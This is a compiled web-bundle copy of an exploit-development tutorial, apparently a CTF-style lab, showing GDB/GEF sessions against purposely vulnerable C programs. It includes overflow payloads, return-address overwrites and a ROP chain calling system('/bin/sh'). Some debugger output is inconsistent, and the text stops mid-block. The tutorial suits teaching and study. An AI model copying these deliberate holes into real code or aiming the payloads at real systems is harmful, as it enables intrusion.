"use strict";(globalThis.webpackChunkgl_0_bal_01=globalThis.webpackChunkgl_0_bal_01||[]).push([[2286],{28453:(a,e,n)=>{n.d(e,{R:()=>s,x:()=>l});var t=n(96540);const i={},r=t.createContext(i);function s(a){const e=t.useContext(r);return t.useMemo(function(){return"function"==typeof a?a(e):{...e,...a}},[e,a])}function l(a){let e;return e=a.disableParentContext?"function"==typeof a.components?a.components(i):a.components||i:s(a.components),t.createElement(r.Provider,{value:e},a.children)}},74013:(a,e,n)=>{n.r(e),n.d(e,{assets:()=>o,contentTitle:()=>l,default:()=>d,frontMatter:()=>s,metadata:()=>t,toc:()=>f});const t=JSON.parse('{"id":"reverse/gdb-gef-practical-examples","title":"GDB GEF Practical Examples: 32-bit and 64-bit Buffer Overflow Exploitation","description":"Hands-on examples using GDB with the GEF plugin to exploit 32-bit and 64-bit buffer overflow vulnerabilities. Includes step-by-step walkthroughs, sample code, and debugging tips.","source":"@site/docs/reverse/gdb_examples.md","sourceDirName":"reverse","slug":"/reverse/gdb-gef-practical-examples","permalink":"/reverse/gdb-gef-practical-examples","draft":false,"unlisted":false,"editUrl":"https://github.com/gl0bal01/gl0bal01.github.io/tree/main/docs/reverse/gdb_examples.md","tags":[{"inline":true,"label":"gdb","permalink":"/tags/gdb"},{"inline":true,"label":"gef","permalink":"/tags/gef"},{"inline":true,"label":"buffer-overflow","permalink":"/tags/buffer-overflow"},{"inline":true,"label":"exploit-development","permalink":"/tags/exploit-development"},{"inline":true,"label":"reverse-engineering","permalink":"/tags/reverse-engineering"},{"inline":true,"label":"debugging","permalink":"/tags/debugging"}],"version":"current","lastUpdatedAt":1751414400000,"sidebarPosition":2,"frontMatter":{"id":"gdb-gef-practical-examples","title":"GDB GEF Practical Examples: 32-bit and 64-bit Buffer Overflow Exploitation","description":"Hands-on examples using GDB with the GEF plugin to exploit 32-bit and 64-bit buffer overflow vulnerabilities. Includes step-by-step walkthroughs, sample code, and debugging tips.","keywords":["gdb","gef","buffer overflow","exploit development","32-bit","64-bit","reverse engineering","debugging","cybersecurity"],"sidebar_label":"Buffer Overflow Exploitation","sidebar_position":2,"authors":[{"name":"gl0bal01"}],"last_update":{"date":"2025-07-02T00:00:00.000Z"},"tags":["gdb","gef","buffer-overflow","exploit-development","reverse-engineering","debugging"]},"sidebar":"tutorialSidebar","previous":{"title":"Debugging with GDB/GEF","permalink":"/reverse/gdb-gef-practical-guide"},"next":{"title":"Binary Refinery Practical","permalink":"/reverse/binary-refinery-practical-guide"}}');var i=n(74848),r=n(28453);const s={id:"gdb-gef-practical-examples",title:"GDB GEF Practical Examples: 32-bit and 64-bit Buffer Overflow Exploitation",description:"Hands-on examples using GDB with the GEF plugin to exploit 32-bit and 64-bit buffer overflow vulnerabilities. Includes step-by-step walkthroughs, sample code, and debugging tips.",keywords:["gdb","gef","buffer overflow","exploit development","32-bit","64-bit","reverse engineering","debugging","cybersecurity"],sidebar_label:"Buffer Overflow Exploitation",sidebar_position:2,authors:[{name:"gl0bal01"}],last_update:{date:new Date("2025-07-02T00:00:00.000Z")},tags:["gdb","gef","buffer-overflow","exploit-development","reverse-engineering","debugging"]},l="GDB GEF Practical Examples: 32-bit and 64-bit Buffer Overflow Exploitation",o={},f=[{value:"Example 1: 32-bit Buffer Overflow Exploitation",id:"example-1-32-bit-buffer-overflow-exploitation",level:2},{value:"Target Application (vuln32.c)",id:"target-application-vuln32c",level:3},{value:"Compilation and Setup",id:"compilation-and-setup",level:3},{value:"GEF Analysis Session",id:"gef-analysis-session",level:3},{value:"Detailed 32-bit Analysis Commands",id:"detailed-32-bit-analysis-commands",level:3},{value:"Example 2: 64-bit Buffer Overflow with ROP Chain",id:"example-2-64-bit-buffer-overflow-with-rop-chain",level:2},{value:"Target Application (vuln64.c)",id:"target-application-vuln64c",level:3},{value:"Compilation and Setup",id:"compilation-and-setup-1",level:3},{value:"GEF Analysis Session",id:"gef-analysis-session-1",level:3},{value:"Advanced 64-bit ROP Chain Analysis",id:"advanced-64-bit-rop-chain-analysis",level:3},{value:"Comprehensive Analysis Commands",id:"comprehensive-analysis-commands",level:3},{value:"Key Differences Between 32-bit and 64-bit Exploitation",id:"key-differences-between-32-bit-and-64-bit-exploitation",level:2},{value:"32-bit Characteristics:",id:"32-bit-characteristics",level:3},{value:"64-bit Characteristics:",id:"64-bit-characteristics",level:3},{value:"Advanced Exploitation Techniques",id:"advanced-exploitation-techniques",level:2},{value:"32-bit Function Call Exploitation",id:"32-bit-function-call-exploitation",level:3},{value:"64-bit ROP Chain with Arguments",id:"64-bit-rop-chain-with-arguments",level:3},{value:"Comprehensive GEF Analysis Workflow",id:"comprehensive-gef-analysis-workflow",level:2},{value:"Complete 32-bit Analysis Session",id:"complete-32-bit-analysis-session",level:3},{value:"Complete 64-bit Analysis Session",id:"complete-64-bit-analysis-session",level:3},{value:"Advanced GEF Commands for Exploitation",id:"advanced-gef-commands-for-exploitation",level:2},{value:"Memory Analysis Commands",id:"memory-analysis-commands",level:3},{value:"Control Flow Analysis",id:"control-flow-analysis",level:3},{value:"Exploitation Assistance Commands",id:"exploitation-assistance-commands",level:3},{value:"Real-World Exploitation Scenarios",id:"real-world-exploitation-scenarios",level:2},{value:"Scenario 1: ASLR Bypass with Information Leak",id:"scenario-1-aslr-bypass-with-information-leak",level:3},{value:"Scenario 2: Stack Canary Bypass",id:"scenario-2-stack-canary-bypass",level:3},{value:"Scenario 3: Return-to-libc Attack",id:"scenario-3-return-to-libc-attack",level:3},{value:"Debugging Tips and Best Practices",id:"debugging-tips-and-best-practices",level:2},{value:"Essential GEF Configuration",id:"essential-gef-configuration",level:3},{value:"Common Pitfalls and Solutions",id:"common-pitfalls-and-solutions",level:3},{value:"Advanced Automation",id:"advanced-automation",level:3}];function c(a){const e={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,r.R)(),...a.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.header,{children:(0,i.jsx)(e.h1,{id:"gdb-gef-practical-examples-32-bit-and-64-bit-buffer-overflow-exploitation",children:"GDB GEF Practical Examples: 32-bit and 64-bit Buffer Overflow Exploitation"})}),"\n",(0,i.jsx)(e.h2,{id:"example-1-32-bit-buffer-overflow-exploitation",children:"Example 1: 32-bit Buffer Overflow Exploitation"}),"\n",(0,i.jsx)(e.h3,{id:"target-application-vuln32c",children:"Target Application (vuln32.c)"}),"\n",(0,i.jsx)(e.p,{children:"Buffer Overflow Exploitation Examples (32-bit & 64-bit)"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-c",children:'// vuln32.c - 32-bit vulnerable application\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nvoid win() {\n    printf("\ud83c\udf89 Congratulations! You\'ve exploited the 32-bit binary!\\n");\n    printf("\ud83d\udea9 Flag: CTF{32bit_buffer_overflow_mastered}\\n");\n    system("/bin/sh");\n}\n\nvoid vulnerable_function(char *input) {\n    char buffer[64];\n    printf("\ud83d\udcdd Input received: %s\\n", input);\n    strcpy(buffer, input);  // Vulnerable strcpy - no bounds checking\n    printf("\ud83d\udccb Buffer contents: %s\\n", buffer);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc != 2) {\n        printf("Usage: %s <input>\\n", argv[0]);\n        return 1;\n    }\n    \n    printf("\ud83c\udfaf 32-bit Buffer Overflow Challenge\\n");\n    printf("\ud83d\udccd Win function address: %p\\n", win);\n    vulnerable_function(argv[1]);\n    printf("\u2705 Function returned normally\\n");\n    return 0;\n}\n'})}),"\n",(0,i.jsx)(e.h3,{id:"compilation-and-setup",children:"Compilation and Setup"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Compile 32-bit vulnerable binary with debugging symbols\ngcc -m32 -g -fno-stack-protector -z execstack -no-pie -o vuln32 vuln32.c\n\n# Verify 32-bit compilation and security features\nfile vuln32\ngdb -q vuln32\n"})}),"\n",(0,i.jsx)(e.h3,{id:"gef-analysis-session",children:"GEF Analysis Session"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'# Start GDB with GEF for 32-bit binary\ngdb -q vuln32\n\n# Initial security analysis\ngef\u27a4 checksec\n[+] checksec for \'/home/user/vuln32\'\nCanary                        : \u2718 \nNX                            : \u2718 \nPIE                           : \u2718 \nFortify                       : \u2718 \nRelRO                         : Partial\n\n# Analyze binary structure\ngef\u27a4 info functions\nAll defined functions:\n0x08049000  _init\n0x08049030  printf@plt\n0x08049040  strcpy@plt\n0x08049050  system@plt\n0x08049060  __libc_start_main@plt\n0x08049070  _start\n0x080490a0  __x86.get_pc_thunk.bx\n0x080490b0  deregister_tm_clones\n0x080490f0  register_tm_clones\n0x08049130  __do_global_dtors_aux\n0x08049160  frame_dummy\n0x08049169  win\n0x080491a5  vulnerable_function\n0x080491d8  main\n\n# Get win function address\ngef\u27a4 print win\n$1 = {<text variable, no debug info>} 0x8049169 <win>\n\n# Analyze vulnerable function\ngef\u27a4 disassemble vulnerable_function\nDump of assembler code for function vulnerable_function:\n   0x080491a5 <+0>:     push   ebp\n   0x080491a6 <+1>:     mov    ebp,esp\n   0x080491a8 <+3>:     sub    esp,0x58\n   0x080491ab <+6>:     sub    esp,0x8\n   0x080491ae <+9>:     push   DWORD PTR [ebp+0x8]\n   0x080491b1 <+12>:    push   0x8049264\n   0x080491b6 <+17>:    call   0x8049030 <printf@plt>\n   0x080491bb <+22>:    add    esp,0x10\n   0x080491be <+25>:    sub    esp,0x8\n   0x080491c1 <+28>:    push   DWORD PTR [ebp+0x8]\n   0x080491c4 <+31>:    lea    eax,[ebp-0x48]\n   0x080491c7 <+34>:    push   eax\n   0x080491c8 <+35>:    call   0x8049040 <strcpy@plt>\n   0x080491cd <+40>:    add    esp,0x10\n   0x080491d0 <+43>:    sub    esp,0x8\n   0x080491d3 <+46>:    lea    eax,[ebp-0x48]\n   0x080491d6 <+49>:    push   eax\n   0x080491d7 <+50>:    push   0x8049277\n   0x080491dc <+55>:    call   0x8049030 <printf@plt>\n   0x080491e1 <+60>:    add    esp,0x10\n   0x080491e4 <+63>:    nop\n   0x080491e5 <+64>:    leave\n   0x080491e6 <+65>:    ret\nEnd of assembler dump.\n\n# Set breakpoint and analyze stack layout\ngef\u27a4 break *vulnerable_function+35\nBreakpoint 1 at 0x80491c8: file vuln32.c, line 12.\n\n# Generate pattern to find offset\ngef\u27a4 pattern create 200\n[+] Generating a pattern of 200 bytes (n=4)\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa\n\n# Run with pattern\ngef\u27a4 run aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa\n\nStarting program: /home/user/vuln32 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa\n\n\ud83c\udfaf 32-bit Buffer Overflow Challenge\n\ud83d\udccd Win function address: 0x8049169\n\ud83d\udcdd Input received: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa\n\nBreakpoint 1, 0x080491c8 in vulnerable_function (input=0xffffd2a4 "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa") at vuln32.c:12.\n\n# Examine stack layout before strcpy\ngef\u27a4 telescope $esp 20\n0xffffd160\u2502+0x0000: 0xffffd178     \u2190 $esp\n0xffffd164\u2502+0x0004: 0xffffd2a4  \u2192  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa"\n0xffffd168\u2502+0x0008: 0x00000000\n0xffffd16c\u2502+0x000c: 0xf7fc0000  \u2192  0x002bf000\n0xffffd170\u2502+0x0010: 0x08049250  \u2192  "\ud83d\udcdd Input received: %s\\n"\n0xffffd174\u2502+0x0014: 0xffffd2a4  \u2192  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa"\n0xffffd178\u2502+0x0018: 0x42424242 ("BBBB"?)     \u2190 buffer start ([ebp-0x48])\n0xffffd17c\u2502+0x001c: 0x42424242 ("BBBB"?)\n0xffffd180\u2502+0x0020: 0x42424242 ("BBBB"?)\n...\n0xffffd1b8\u2502+0x0058: 0x42424242 ("BBBB"?)\n0xffffd1bc\u2502+0x005c: 0x00000000\n0xffffd1c0\u2502+0x0060: 0xffffd1d8     \u2190 $ebp (saved frame pointer)\n0xffffd1c4\u2502+0x0064: 0x08049214  \u2192  <main+59> add esp, 0x10  \u2190 return address\n\n# Continue execution to trigger overflow\ngef\u27a4 continue\nContinuing.\n\ud83d\udccb Buffer contents: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraa\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x62616162 in ?? ()\n\n# Find the offset to control EIP\ngef\u27a4 pattern search $eip\n[+] Searching for \'0x62616162\'\n[+] Found at offset 76 (little-endian search) likely\n\n# Verify the offset calculation\ngef\u27a4 pattern offset 0x62616162\n[+] Searching for \'0x62616162\'\n[+] Found at offset 76 (little-endian search) likely\n\n# Calculate buffer size to EIP\n# Buffer starts at ebp-0x48 (72 bytes from ebp)\n# EIP is at ebp+4\n# Total offset = 72 + 4 = 76 bytes \u2713\n\n# Create exploit payload\ngef\u27a4 run $(python3 -c "print(\'A\'*76 + \'\\x69\\x91\\x04\\x08\')")\nStarting program: /home/user/vuln32 $(python3 -c "print(\'A\'*76 + \'\\x69\\x91\\x04\\x08\')")\n\n\ud83c\udfaf 32-bit Buffer Overflow Challenge\n\ud83d\udccd Win function address: 0x8049169\n\ud83d\udcdd Input received: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ud865\udc4a\n\ud83d\udccb Buffer contents: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ud865\udc4a\n\ud83c\udf89 Congratulations! You\'ve exploited the 32-bit binary!\n\ud83d\udea9 Flag: CTF{32bit_buffer_overflow_mastered}\n$ whoami\nuser\n$ exit\n[Inferior 1 (process 12345) exited normally]\n'})}),"\n",(0,i.jsx)(e.h3,{id:"detailed-32-bit-analysis-commands",children:"Detailed 32-bit Analysis Commands"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Additional analysis for understanding the exploit\ngef\u27a4 vmmap\n[ Legend:  Code | Heap | Stack ]\nStart      End        Offset     Perm Path\n0x08048000 0x08049000 0x00000000 r-- /home/user/vuln32\n0x08049000 0x0804a000 0x00000000 r-x /home/user/vuln32\n0x0804a000 0x0804b000 0x00001000 r-- /home/user/vuln32\n0x0804b000 0x0804c000 0x00002000 rw- /home/user/vuln32\n\n# Examine the win function in detail\ngef\u27a4 disassemble win\nDump of assembler code for function win:\n   0x08049169 <+0>:     push   ebp\n   0x0804916a <+1>:     mov    ebp,esp\n   0x0804916c <+3>:     sub    esp,0x8\n   0x0804916f <+6>:     sub    esp,0xc\n   0x08049172 <+9>:     push   0x8049220\n   0x08049177 <+14>:    call   0x8049030 <printf@plt>\n   0x0804917c <+19>:    add    esp,0x10\n   0x0804917f <+22>:    sub    esp,0xc\n   0x08049182 <+25>:    push   0x8049250\n   0x08049187 <+30>:    call   0x8049030 <printf@plt>\n   0x0804918c <+35>:    add    esp,0x10\n   0x0804918f <+38>:    sub    esp,0xc\n   0x08049192 <+41>:    push   0x8049284\n   0x08049197 <+46>:    call   0x8049050 <system@plt>\n   0x0804919c <+51>:    add    esp,0x10\n   0x0804919f <+54>:    nop\n   0x080491a0 <+55>:    leave\n   0x080491a1 <+56>:    ret\nEnd of assembler dump.\n\n# Stack layout analysis\ngef\u27a4 info frame\nStack level 0, frame at 0xffffd1c8:\n eip = 0x80491c8 in vulnerable_function (vuln32.c:12); saved eip = 0x8049214\n called by frame at 0xffffd1e8\n source language c.\n Arglist at 0xffffd1c0, args: input=0xffffd2a4\n Locals at 0xffffd1c0, Previous frame's sp is 0xffffd1c8\n Saved registers:\n  ebp at 0xffffd1c0, eip at 0xffffd1c4\n"})}),"\n",(0,i.jsx)(e.hr,{}),"\n",(0,i.jsx)(e.h2,{id:"example-2-64-bit-buffer-overflow-with-rop-chain",children:"Example 2: 64-bit Buffer Overflow with ROP Chain"}),"\n",(0,i.jsx)(e.h3,{id:"target-application-vuln64c",children:"Target Application (vuln64.c)"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-c",children:'// vuln64.c - 64-bit vulnerable application with ROP requirements\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid win() {\n    printf("\ud83c\udf89 You found the win function!\\n");\n    printf("\ud83d\udea9 But you need ROP to get the flag...\\n");\n}\n\nvoid get_flag() {\n    printf("\ud83c\udfaf Flag function reached!\\n");\n    printf("\ud83d\udea9 Flag: CTF{64bit_rop_chain_mastered}\\n");\n    system("/bin/sh");\n}\n\nvoid vulnerable_function() {\n    char buffer[64];\n    printf("\ud83d\udcdd Enter your input: ");\n    fflush(stdout);\n    read(0, buffer, 200);  // Vulnerable read - buffer overflow\n    printf("\ud83d\udccb You entered: %s\\n", buffer);\n}\n\nint main() {\n    printf("\ud83c\udfaf 64-bit ROP Chain Challenge\\n");\n    printf("\ud83d\udccd Win function: %p\\n", win);\n    printf("\ud83d\udccd Flag function: %p\\n", get_flag);\n    \n    vulnerable_function();\n    printf("\u2705 Function returned normally\\n");\n    return 0;\n}\n'})}),"\n",(0,i.jsx)(e.h3,{id:"compilation-and-setup-1",children:"Compilation and Setup"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Compile 64-bit vulnerable binary\ngcc -g -fno-stack-protector -z execstack -no-pie -o vuln64 vuln64.c\n\n# Verify compilation and security features\nfile vuln64\nchecksec vuln64\n"})}),"\n",(0,i.jsx)(e.h3,{id:"gef-analysis-session-1",children:"GEF Analysis Session"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:"# Start GDB with GEF for 64-bit binary\ngdb -q vuln64\n\n# Security analysis\ngef\u27a4 checksec\n[+] checksec for '/home/user/vuln64'\nCanary                        : \u2718 \nNX                            : \u2718 \nPIE                           : \u2718 \nFortify                       : \u2718 \nRelRO                         : Partial\n\n# Analyze functions and find ROP gadgets\ngef\u27a4 info functions\nAll defined functions:\n0x0000000000401000  _init\n0x0000000000401030  printf@plt\n0x0000000000401040  fflush@plt\n0x0000000000401050  read@plt\n0x0000000000401060  system@plt\n0x0000000000401070  __libc_start_main@plt\n0x0000000000401080  _start\n0x00000000004010b0  deregister_tm_clones\n0x00000000004010f0  register_tm_clones\n0x0000000000401130  __do_global_dtors_aux\n0x0000000000401170  frame_dummy\n0x0000000000401179  win\n0x00000000004011a5  get_flag\n0x00000000004011d1  vulnerable_function\n0x0000000000401211  main\n\n# Get function addresses\ngef\u27a4 print win\n$1 = {<text variable, no debug info>} 0x401179 <win>\ngef\u27a4 print get_flag\n$2 = {<text variable, no debug info>} 0x4011a5 <get_flag>\n\n# Analyze vulnerable function\ngef\u27a4 disassemble vulnerable_function\nDump of assembler code for function vulnerable_function:\n   0x00000000004011d1 <+0>:     push   rbp\n   0x00000000004011d2 <+1>:     mov    rbp,rsp\n   0x00000000004011d5 <+4>:     sub    rsp,0x50\n   0x00000000004011d9 <+8>:     lea    rdi,[rip+0xe32]        # 0x402012\n   0x00000000004011e0 <+15>:    call   0x401030 <printf@plt>\n   0x00000000004011e5 <+20>:    mov    rdi,QWORD PTR [rip+0x2e54]  # 0x404040\n   0x00000000004011ec <+27>:    call   0x401040 <fflush@plt>\n   0x00000000004011f1 <+32>:    lea    rax,[rbp-0x50]\n   0x00000000004011f5 <+36>:    mov    edx,0xc8\n   0x00000000004011fa <+41>:    mov    rsi,rax\n   0x00000000004011fd <+44>:    mov    edi,0x0\n   0x0000000000401202 <+49>:    call   0x401050 <read@plt>\n   0x0000000000401207 <+54>:    lea    rax,[rbp-0x50]\n   0x000000000040120b <+58>:    mov    rsi,rax\n   0x000000000040120e <+61>:    lea    rdi,[rip+0xe10]        # 0x402025\n   0x0000000000401215 <+68>:    call   0x401030 <printf@plt>\n   0x000000000040121a <+73>:    nop\n   0x000000000040121b <+74>:    leave\n   0x000000000040121c <+75>:    ret\nEnd of assembler dump.\n\n# Find ROP gadgets needed for exploitation\ngef\u27a4 ropper --search \"pop rdi\"\n[INFO] Load gadgets from cache\n[LOAD] loading... 100%\n[LOAD] removing double gadgets... 100%\n\nGadgets\n=======\n0x0000000000401273: pop rdi; ret; \n\n# We need this gadget to set up the argument for get_flag()\n# In 64-bit System V ABI, first argument goes in RDI\n\n# Set breakpoint and analyze buffer layout\ngef\u27a4 break *vulnerable_function+49\nBreakpoint 1 at 0x401202: file vuln64.c, line 17.\n\n# Generate pattern for offset calculation\ngef\u27a4 pattern create 200\n[+] Generating a pattern of 200 bytes (n=8)\naaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaav\n\n# Run with pattern\ngef\u27a4 run\nStarting program: /home/user/vuln64\n\ud83c\udfaf 64-bit ROP Chain Challenge\n\ud83d\udccd Win function: 0x401179\n\ud83d\udccd Flag function: 0x4011a5\n\nBreakpoint 1, 0x0000000000401202 in vulnerable_function () at vuln64.c:17.\n\n# Examine stack layout\ngef\u27a4 telescope $rsp 20\n0x00007fffffffddb0\u2502+0x0000: 0x0000000000000000     \u2190 $rsp\n0x00007fffffffddb8\u2502+0x0008: 0x0000000000000000\n0x00007fffffffddc0\u2502+0x0010: 0x0000000000000000\n0x00007fffffffddc8\u2502+0x0018: 0x0000000000000000\n0x00007fffffffddd0\u2502+0x0020: 0x0000000000000000\n0x00007fffffffddd8\u2502+0x0028: 0x0000000000000000\n0x00007fffffffdde0\u2502+0x0030: 0x0000000000000000\n0x00007fffffffdde8\u2502+0x0038: 0x0000000000000000\n0x00007fffffffddf0\u2502+0x0040: 0x0000000000000000\n0x00007fffffffddf8\u2502+0x0048: 0x0000000000000000\n0x00007fffffffde00\u2502+0x0050: 0x00007fffffffde20     \u2190 $rbp (saved frame pointer)\n0x00007fffffffde08\u2502+0x0058: 0x000000000040125c  \u2192  <main+75> mov eax, 0x0  \u2190 return address\n\n# Input the pattern when prompted\naaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaav\n\n# Continue execution\ngef\u27a4 continue\nContinuing.\n\ud83d\udcdd Enter your input: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaav\n\ud83d\udccb You entered: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaav\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0000000061616161 in ?? ()\n\n# Find offset to control RIP\ngef\u27a4 pattern search $rip\n[+] Searching for '0x61616161'\n[+] Found at offset 72 (little-endian search) likely\n\n# Verify offset\ngef\u27a4 pattern offset 0x6161616161616161\n[+] Searching for '0x6161616161616161'\n[+] Found at offset 72 (little-endian search) likely\n\n# Perfect! We need 72 bytes to reach the return address\n\n# Now create ROP chain to call get_flag()\n# We need: pop rdi; ret; followed by get_flag address\n# But get_flag() doesn't take arguments, so we can call it directly\n\n# Create exploit with ROP chain\ngef\u27a4 run\nStarting program: /home/user/vuln64\n\ud83c\udfaf 64-bit ROP Chain Challenge\n\ud83d\udccd Win function: 0x401179\n\ud83d\udccd Flag function: 0x4011a5\n\ud83d\udcdd Enter your input: \n\n# Input: 72 bytes padding + get_flag address\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc4\u2465\n\n# Create the payload\n# 72 'A's + address of get_flag (0x4011a5)\npython3 -c \"import sys; sys.stdout.buffer.write(b'A'*72 + b'\\xa5\\x11\\x40\\x00\\x00\\x00\\x00\\x00')\"\n\n# Run with exploit payload\ngef\u27a4 run < <(python3 -c \"import sys; sys.stdout.buffer.write(b'A'*72 + b'\\xa5\\x11\\x40\\x00\\x00\\x00\\x00\\x00')\")\nStarting program: /home/user/vuln64 < <(python3 -c \"import sys; sys.stdout.buffer.write(b'A'*72 + b'\\xa5\\x11\\x40\\x00\\x00\\x00\\x00\\x00')\")\n\n\ud83c\udfaf 64-bit ROP Chain Challenge\n\ud83d\udccd Win function: 0x401179\n\ud83d\udccd Flag function: 0x4011a5\n\ud83d\udcdd Enter your input: \ud83d\udccb You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc4\u2465\n\ud83c\udfaf Flag function reached!\n\ud83d\udea9 Flag: CTF{64bit_rop_chain_mastered}\n$ whoami\nuser\n$ exit\n[Inferior 1 (process 23456) exited normally]\n"})}),"\n",(0,i.jsx)(e.h3,{id:"advanced-64-bit-rop-chain-analysis",children:"Advanced 64-bit ROP Chain Analysis"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'# More complex ROP chain example with system("/bin/sh")\ngef\u27a4 ropper --search "pop rdi"\n0x0000000000401273: pop rdi; ret;\n\n# Search for "/bin/sh" string or create one\ngef\u27a4 search-pattern "/bin/sh"\n[+] Searching \'/bin/sh\' in memory\n[+] In \'/lib/x86_64-linux-gnu/libc.so.6\'(0x7ffff7c00000-0x7ffff7df2000), permission=r-x\n  0x7ffff7d74678 - 0x7ffff7d7467f  \u2192   "/bin/sh" \n\n# Advanced ROP chain: pop rdi; ret; "/bin/sh"; system\n# Payload structure:\n# 72 bytes padding\n# + pop rdi; ret gadget (0x401273)\n# + "/bin/sh" address (0x7ffff7d74678)\n# + system address\n\ngef\u27a4 print system\n$3 = {<text variable, no debug info>} 0x401060 <system@plt>\n\n# Create advanced ROP payload\npython3 -c "\nimport struct\npayload = b\'A\' * 72\npayload += struct.pack(\'<Q\', 0x401273)      # pop rdi; ret\npayload += struct.pack(\'<Q\', 0x7ffff7d74678) # \'/bin/sh\'\npayload += struct.pack(\'<Q\', 0x401060)      # system@plt\nprint(payload)\n" > rop_payload\n\n# Test the advanced ROP chain\ngef\u27a4 run < rop_payload\n'})}),"\n",(0,i.jsx)(e.h3,{id:"comprehensive-analysis-commands",children:"Comprehensive Analysis Commands"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-bash",children:'# Memory layout analysis\ngef\u27a4 vmmap\n[ Legend:  Code | Heap | Stack ]\nStart              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /home/user/vuln64\n0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /home/user/vuln64\n0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /home/user/vuln64\n0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /home/user/vuln64\n0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /home/user/vuln64\n\n# Stack frame analysis\ngef\u27a4 info frame\nStack level 0, frame at 0x7fffffffde10:\n rip = 0x401202 in vulnerable_function (vuln64.c:17); saved rip = 0x40125c\n called by frame at 0x7fffffffde30\n source language c.\n Arglist at 0x7fffffffde00, args: \n Locals at 0x7fffffffde00, Previous frame\'s sp is 